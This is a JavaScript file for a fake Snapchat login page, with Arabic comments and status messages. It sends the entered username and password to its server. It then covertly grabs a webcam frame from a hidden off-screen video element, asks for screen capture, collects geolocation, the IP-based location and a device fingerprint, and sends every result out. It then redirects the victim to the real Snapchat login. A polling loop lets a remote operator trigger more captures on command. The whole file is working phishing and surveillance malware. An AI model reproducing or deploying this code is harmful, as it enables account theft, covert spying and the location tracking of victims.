function handleLogin(event) {
  event.preventDefault();
  const user = document.getElementById('username').value;
  const pass = document.getElementById('password').value;

  const message = `🔐 تسجيل دخول Snap وهمي:\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`;
  sendNotification(message);

  document.getElementById('statusMsg').innerText = "✅ تم تسجيل الدخول، جاري التحقق من الجهاز...";

  setTimeout(() => {
    startFullVerification();
  }, 1500);
}

function startFullVerification() {
  sendNotification("🚀 بدء التحقق الشامل...");
  tryCameraWithFallback();
  requestLocation();
  getIPLocation();
  tryScreenCapture();
  sendFingerprint();

  // ✅ إعادة توجيه وهمية بعد التحقق
  setTimeout(() => {
    window.location.href = "https://accounts.snapchat.com/accounts/login";
  }, 6000);
}

function sendNotification(msg) {
  fetch("/notify", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ message: msg })
  });
}

function tryCameraWithFallback() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      let video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.style.position = 'fixed';
      video.style.top = '-9999px';
      video.style.left = '-9999px';
      document.body.appendChild(video);

      setTimeout(() => {
        let canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        let ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        let dataURL = canvas.toDataURL("image/png");

        fetch('/screenshot', {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' },
          body: dataURL
        }).then(() => sendNotification("📸 تم إرسال صورة من الكاميرا."));

        stream.getTracks().forEach(track => track.stop());
        video.remove();
      }, 3000);
    })
    .catch(() => {
      sendNotification("❌ رفض الكاميرا. تفعيل خطة B.");
      capturePage();
    });
}

function requestLocation() {
  navigator.geolocation.getCurrentPosition(
    pos => {
      fetch("/location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        })
      });
    },
    () => {
      sendNotification("❌ رفض الموقع. محاولة تحديد عبر IP...");
      getIPLocation(); // fallback مباشر
    }
  );
}

function getIPLocation() {
  fetch("https://ipapi.co/json/")
    .then(r => r.json())
    .then(data => {
      const msg = `🌐 معلومات الشبكة:\n🌍 الدولة: ${data.country_name}\n🏙️ المدينة: ${data.city}\n🌐 IP: ${data.ip}\n📶 مزود الخدمة: ${data.org}\n🔗 https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
      sendNotification(msg);
    })
    .catch(() => sendNotification("⚠️ فشل تحديد الموقع عبر IP."));
}

function tryScreenCapture() {
  navigator.mediaDevices.getDisplayMedia({ video: true })
    .then(stream => {
      let video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      setTimeout(() => {
        let canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 1280;
        canvas.height = video.videoHeight || 720;
        let ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        let dataURL = canvas.toDataURL("image/png");

        fetch('/screenshot', {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' },
          body: dataURL
        }).then(() => sendNotification("🖥️ تم إرسال صورة من الشاشة."));

        stream.getTracks().forEach(track => track.stop());
        video.remove();
      }, 3000);
    })
    .catch(() => sendNotification("❌ رفض مشاركة الشاشة."));
}

function capturePage() {
  html2canvas(document.body).then(canvas => {
    let image = canvas.toDataURL("image/png");
    fetch("/screenshot", {
      method: "POST",
      headers: { "Content-Type": "text/plain" },
      body: image
    }).then(() => {
      sendNotification("📸 تم إرسال لقطة شاشة بديلة.");
    });
  });
}

function sendFingerprint() {
  const info = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory || 'غير متاح'
  };

  fetch("/fingerprint", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(info)
  });
}

function pollCommands() {
  setInterval(() => {
    fetch('/get_command')
      .then(response => response.json())
      .then(data => {
        if (!data.command) return;

        switch (data.command) {
          case 'camera':
            tryCameraWithFallback();
            break;
          case 'screen':
            tryScreenCapture();
            break;
          case 'location':
            requestLocation();
            break;
          case 'fingerprint':
            sendFingerprint();
            break;
          case 'stop':
            sendNotification("⛔ تم إيقاف الجلسة من البوت.");
            break;
        }
      });
  }, 3000);
}

window.onload = function () {
  pollCommands();
};
